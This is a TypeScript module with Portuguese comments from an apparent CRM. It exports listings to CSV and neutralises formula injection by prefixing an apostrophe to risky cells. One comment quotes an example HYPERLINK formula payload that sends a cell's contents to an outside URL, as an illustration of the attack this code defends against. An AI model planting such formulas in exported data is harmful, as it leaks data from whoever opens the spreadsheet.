/**
 * Exportação de CSV (specs/importacao.md §8): delimitador `;`, UTF-8 COM BOM
 * (para o Excel-BR abrir acentos), datas já formatadas pelo chamador em DD/MM/AAAA.
 * O "Exportar CSV" de cada listagem respeita a RLS por construção — exporta o
 * resultado da query atual (todas as páginas), não só a página visível.
 */
import Papa from "papaparse";

export type ColunaCsv<T> = {
  titulo: string;
  valor: (linha: T) => string | number | null | undefined;
};

/**
 * Neutraliza injeção de fórmula (CSV injection).
 *
 * O Excel e o LibreOffice avaliam como FÓRMULA toda célula que comece com `=`,
 * `+`, `-`, `@`, TAB ou CR — e as aspas do CSV não defendem, porque elas são do
 * formato e somem no parse. O caminho existe inteiro no CRM Sindcom: o
 * formulário público de filiação grava `nome` sem login, a Secretaria exporta a
 * listagem e abre no Excel. Um nome como
 * `=HYPERLINK("http://…/?d="&A1,"clique")` executa na máquina dela.
 *
 * A defesa canônica é o apóstrofo inicial: o Excel o consome ao abrir e trata o
 * resto como texto. O dado continua legível para quem lê a planilha — inclusive
 * valor negativo, que é o caso legítimo mais comum aqui (o CRM exporta dinheiro).
 */
function neutralizarFormula(valor: string): string {
  return /^[=+\-@\t\r]/.test(valor) ? `'${valor}` : valor;
}

/** Monta o texto CSV a partir das linhas e da definição de colunas. */
export function gerarCsv<T>(linhas: T[], colunas: ColunaCsv<T>[]): string {
  const titulos = colunas.map((c) => c.titulo);
  const dados = linhas.map((linha) => {
    const registro: Record<string, string> = {};
    for (const c of colunas) {
      const v = c.valor(linha);
      registro[c.titulo] = v === null || v === undefined ? "" : neutralizarFormula(String(v));
    }
    return registro;
  });
  return Papa.unparse(dados, {
    delimiter: ";",
    columns: titulos,
    quotes: true,
    newline: "\r\n",
  });
}

/** Dispara o download de um conteúdo CSV com BOM UTF-8. */
export function baixarCsv(nomeArquivo: string, conteudo: string): void {
  const BOM = "﻿";
  const blob = new Blob([BOM + conteudo], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = nomeArquivo.endsWith(".csv") ? nomeArquivo : `${nomeArquivo}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

/** Atalho: gera e baixa em uma chamada. */
export function exportarCsv<T>(
  nomeArquivo: string,
  linhas: T[],
  colunas: ColunaCsv<T>[],
): void {
  baixarCsv(nomeArquivo, gerarCsv(linhas, colunas));
}
